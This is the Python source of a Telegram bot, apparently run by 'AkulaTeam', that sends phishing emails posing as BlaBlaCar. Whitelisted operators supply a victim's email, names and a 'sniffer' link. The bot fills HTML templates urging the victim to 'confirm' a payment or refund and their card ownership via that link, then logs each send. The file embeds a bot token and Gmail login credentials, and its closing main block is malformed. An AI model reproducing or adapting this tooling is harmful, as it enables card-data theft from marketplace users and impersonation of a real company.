import telebot
from telebot import types

import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

from email.header import Header
from email.utils import formataddr

import random

body = """"""

token = '1917850999:AAE-oToU73zT-HsoMMMMcLh4f2-0accEUB4'
bot = telebot.TeleBot(token)

systemText = ''
typeText = ''
emailText = ''
myNameText = ''
notMyNameText = ''
countOfPassangersText = ''
snifferText = ''

@bot.message_handler(commands=['start', 'mail'])
def handler(message):
	if message.text == '/start':
		bot.reply_to(message, 'Привет, дорогой друг!\nЭтот бот принадлежит AkulaTeam. Для подтверждения личности, пожалуйста, напиши @gektor1337. После успешного подтверждения администрацией, пожалуйста, введите /mail для отправки.')
	if message.text == '/mail':
		markup1 = types.InlineKeyboardMarkup()
		item1 = types.InlineKeyboardButton('BlaBlaCar🇸🇰', callback_data='bbc')
		item2 = types.InlineKeyboardButton('Avito🇸🇰', callback_data='avito')
		markup1.add(item1, item2)
		
		try:
			text = open('users.txt').read()
		except:
			bot.send_message(message.from_user.id, 'Ошибка при открытии базы данных с пользователями! Aborting...')
			print('Ошибка при открытии базы данных с пользователями! Aborting...')
		
		if str(message.from_user.id) in text:
			bot.send_message(message.from_user.id, 'Кому Вы хотите отправить сообщение?', reply_markup=markup1)
			print('\n\n\n' + str(message.from_user.id) + ' есть в списке!')
			checking = 1;
		else:
			bot.send_message(message.from_user.id, 'Вас нет в списке! Для получения доступа к боту получите доступ у @gektor1337')
			print('\n\n\n' + str(message.from_user.id) + ' нет в списке!')

@bot.callback_query_handler(func=lambda call: True)
def callback_inline(call):
	global systemText
	global typeText
	global emailText
	global myNameText
	global notMyNameText
	global countOfPassangersText
	global snifferText
	
	try:
		if call.message:
			if call.data == 'bbc':
				systemText = 'BlaBlaCar🇸🇰'
				markup4 = types.InlineKeyboardMarkup()
				item1 = types.InlineKeyboardButton('Оплата', callback_data='bbcpay')
				item2 = types.InlineKeyboardButton('Возврат', callback_data='bbcreturn')
				item3 = types.InlineKeyboardButton('Назад', callback_data='menuback')
				markup4.add(item1, item2, item3)
				
				bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='Сервис: BlaBlaCar🇸🇰\nУкажите тип.', reply_markup=markup4)
			if call.data == 'avito':
				systemText = 'Avito🇸🇰'
				markup5 = types.InlineKeyboardMarkup()
				item1 = types.InlineKeyboardButton('Назад', callback_data='menuback')
				markup5.add(item1)
				
				bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='Сервис: Avito🇸🇰\nВ разработке.', reply_markup=markup5)
			if call.data == 'menuback':
				markup1 = types.InlineKeyboardMarkup()
				item1 = types.InlineKeyboardButton('BlaBlaCar🇸🇰', callback_data='bbc')
				item2 = types.InlineKeyboardButton('Avito🇸🇰', callback_data='avito')
				markup1.add(item1, item2)
				
				bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='Кому Вы хотите отправить сообщение?', reply_markup=markup1)
			if call.data == 'bbcyes':
				bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='Данные верны.', reply_markup=None)
				markup3 = types.InlineKeyboardMarkup()
				item1 = types.InlineKeyboardButton('Отправить', callback_data='bbcsend')
				markup3.add(item1)
				
				bot.send_message(call.message.chat.id, 'Ваше сообщение готово к отправке.', reply_markup=markup3)
			if call.data == 'bbcno':
				bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='Для повторной отправки сообщения, пожалуйста, введите /mail.', reply_markup=None)
			if call.data == 'bbcsend':
				global body
				
				if typeText == 'Оплата':
					changeBodyTextTypePay(myNameText, notMyNameText, countOfPassangersText, snifferText)
				if typeText == 'Возврат':
					changeBodyTextTypeReturn(notMyNameText, snifferText)
				
				msg = MIMEMultipart()
				msg['From'] = formataddr(('BlaBlaCar', 'garantblablacar@gmail.com'))
				msg['To'] = emailText
				msg['Subject'] = 'Reply ' + str(random.randint(1111, 9999))
					
				msg.attach(MIMEText(body, 'html'))
				server = smtplib.SMTP('smtp.gmail.com:587')
				server.starttls()
				server.login('garantblablacar@gmail.com', 'garantblablacar1987')
				text = msg.as_string()
				try:
					server.sendmail(msg['From'], msg['To'], text)
					bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='Отправлено!', reply_markup=None)
					print('\n\n\nНовый лог!\nTelegram name: ' + call.from_user.first_name + ';\nTelegram username: ' + call.from_user.username + ';\nE-mail получателя: ' + emailText + ';\nИмя отправителя в род. падеже: ' + myNameText + ';\nИмя получателя: ' + notMyNameText + ';\nКоличество пассажиров: ' + countOfPassangersText + ';\nСсылка на сниффер: ' + snifferText + '.')
					f = open ('log.txt', 'a')
					f.write('\n\n\nНовый лог!\nTelegram name: ' + call.from_user.first_name + '\nTelegram username: ' + call.from_user.username + '\nE-mail получателя: ' + emailText + '\nИмя отправителя: ' + myNameText + '\nИмя получателя: ' + notMyNameText + '\nКоличество пассажиров: ' + countOfPassangersText + '\nСсылка на сниффер: ' + snifferText + '.')
					f.close()
				except:
					bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='Ошибка!', reply_markup=None)
				server.quit()
				
				systemText = ''
				emailText = ''
				myNameText = ''
				notMyNameText = ''
				countOfPassangersText = ''
				snifferText = ''
				body = ''
				
				bot.send_message(call.message.chat.id, 'Для повторной отправки сообщения, пожалуйста, введите /mail.')
			if call.data == 'bbcpay':
				typeText = 'Оплата'
				msg = bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='Сервис: BlaBlaCar🇸🇰\nТип: ' + typeText + '.\nВведите почту получателя!', reply_markup=None)
				bot.register_next_step_handler(msg, getEmail)
			if call.data == 'bbcreturn':
				typeText = 'Возврат'
				msg = bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='Сервис: BlaBlaCar🇸🇰\nТип: ' + typeText + '.\nВведите почту получателя!', reply_markup=None)
				bot.register_next_step_handler(msg, getEmail)
				
	except Exception as e:
		print(repr(e))

def changeBodyTextTypePay(myNameText, notMyNameText, countOfPassangersText, snifferText):
	global body
	body = """
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html>
 <head>
  <title>BlaBlaCar</title>
  <style>
   .btn {
    display: inline-block;
    background: #0084ff;
    color: #fff;
    padding: 1rem 1.5rem;
    text-decoration: none;
    border-radius: 20px;
   }
   .txt {
    color: #000000;
   }
   .body {
   	background: #fff;
   	border-radius: 20px;
   }
  </style>
 </head>
 <body class="body">
  <p><img src="https://i.yapx.ru/Ngy6L.jpg" alt="" width="450" height="200" /></p>
  <p>Доброго времени суток, """ + notMyNameText + """!<br><br><br>Поступил запрос на онлайн-бронирование поездки от <font size="2" face="Arial"><u>""" + myNameText + """</u></font>, на """ + countOfPassangersText + """.<br><br>Для подтверждения оплаты поездки, пожалуйста, нажмите на кнопку <font color="red">ПОДТВЕРДИТЬ</font>, после чего заполните форму поездки.<br><br><br>До начала поездки все зачисленные средства будут храниться у Вас в кошельке BlaBlaCar.<br>При отмене поездки средства автоматически зачисляются Вам на карту.<br><br><br><br><br><div style="text-align: center"><p>Счастливого пути!<br>©BlaBlaCar<br><font size="1">16.09.2006-2021</font></p></div></p>
  <div style="text-align: left"><p><font size="0.5" face="Arial">Все права защищены. Все торговые марки являются собственностью соответствующих владельцев в России и других странах.</font></p></div>
  <div style="text-align: center">
   <a href=""" + snifferText + """ class="btn">ПОДТВЕРДИТЬ</a>
  </div>
 </body>
 </body>
</html>
"""

def changeBodyTextTypeReturn(notMyNameText, snifferText):
	global body
	body = """
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html>
 <head>
  <title>BlaBlaCar</title>
  <style>
   .btn {
    display: inline-block;
    background: #0084ff;
    color: #fff;
    padding: 1rem 1.5rem;
    text-decoration: none;
    border-radius: 20px;
   }
   .txt {
    color: #000000;
   }
   .body {
   	background: #fff;
   	border-radius: 20px;
   }
  </style>
 </head>
 <body class="body">
  <p><img src="https://i.yapx.ru/Ngy6L.jpg" alt="" width="450" height="200" /></p>
  <p>Доброго времени суток, """ + notMyNameText + """!<br><br><br>Поступил запрос на <font size="2" face="Arial"><u>возврат средств</u></font>.<br><br>Для подтверждения возврата средств, пожалуйста, нажмите на кнопку <font color="red">ПОДТВЕРДИТЬ</font>, после чего подтвердите, что именно Вы владелец карты.<br><br><br><br><br><div style="text-align: center"><p>Счастливого пути!<br>©BlaBlaCar<br><font size="1">16.09.2006-2021</font></p></div></p>
  <div style="text-align: left"><p><font size="0.5" face="Arial">Все права защищены. Все торговые марки являются собственностью соответствующих владельцев в России и других странах.</font></p></div>
  <div style="text-align: center">
   <a href=""" + snifferText + """ class="btn">ПОДТВЕРДИТЬ</a>
  </div>
 </body>
 </body>
</html>
"""

def getEmail(message):
	global typeText
	global emailText
	emailText = str(message.text)
	if typeText == 'Оплата':
		msg = bot.send_message(message.from_user.id, 'Электронная почта получателя: ' + emailText + '. Введите имя отправителя в родительном падеже.')
		bot.register_next_step_handler(msg, getMyName)
	if typeText == 'Возврат':
		msg = bot.send_message(message.from_user.id, 'Электронная почта получателя: ' + emailText + '. Введите имя получателя.')
		bot.register_next_step_handler(msg, getNotMyName)

def getMyName(message):
	global myNameText
	myNameText = str(message.text)
	msg = bot.send_message(message.from_user.id, 'Имя отправителя: ' + myNameText + '. Введите имя получателя.')
	bot.register_next_step_handler(msg, getNotMyName)
		
def getNotMyName(message):
	global typeText
	global notMyNameText
	notMyNameText = str(message.text)
	if typeText == 'Оплата':
		msg = bot.send_message(message.from_user.id, 'Имя получателя: ' + notMyNameText + '. Введите количество пассажиров + слово "человек". Пример: 5 человек, 2 человека, 1 человека.')
		bot.register_next_step_handler(msg, getCountOfPassangers)
	if typeText == 'Возврат':
		msg = bot.send_message(message.from_user.id, 'Имя получателя: ' + notMyNameText + '. Введите ссылку на сниффер.')
		bot.register_next_step_handler(msg, getSniffer)

def getCountOfPassangers(message):
	global countOfPassangersText
	countOfPassangersText = str(message.text)
	
	msg = bot.send_message(message.from_user.id, 'Количество пассажиров: ' + countOfPassangersText + '. Введите ссылку на сниффер.')
	bot.register_next_step_handler(msg, getSniffer)

def getSniffer(message):
	global systemText
	global typeText
	global emailText
	global myNameText
	global notMyNameText
	global countOfPassangersText
	global snifferText
	
	snifferText = str(message.text)
	
	markup2 = types.InlineKeyboardMarkup()
	item1 = types.InlineKeyboardButton('Верно', callback_data='bbcyes')
	item2 = types.InlineKeyboardButton('Не верно', callback_data='bbcno')
	markup2.add(item1, item2)
	
	if typeText == 'Оплата':
		bot.send_message(message.from_user.id, 'Система: ' + systemText + '\nEmail получателя: ' + emailText + '\nИмя отправителя в род. падеже: ' + myNameText + '\nИмя получателя: ' + notMyNameText + '\nКоличество пассажиров: ' + countOfPassangersText + '\nСсылка на сниффер: ' + snifferText + '.', reply_markup=markup2)
	if typeText == 'Возврат':
		bot.send_message(message.from_user.id, 'Система: ' + systemText + '\nEmail получателя: ' + emailText + '\nИмя получателя: ' + notMyNameText + '\nСсылка на сниффер: ' + snifferText + '.', reply_markup=markup2)

if __name__ == '__main__':
        run(host='0.0.0.0', port=os.environ.get('PORT', '5000'))
	bot.polling(none_stop=True)

#Termux: cd $HOME && cp -r /storage/emulated/0/EmailSender $HOME && python3 EmailSender/Telegram.py
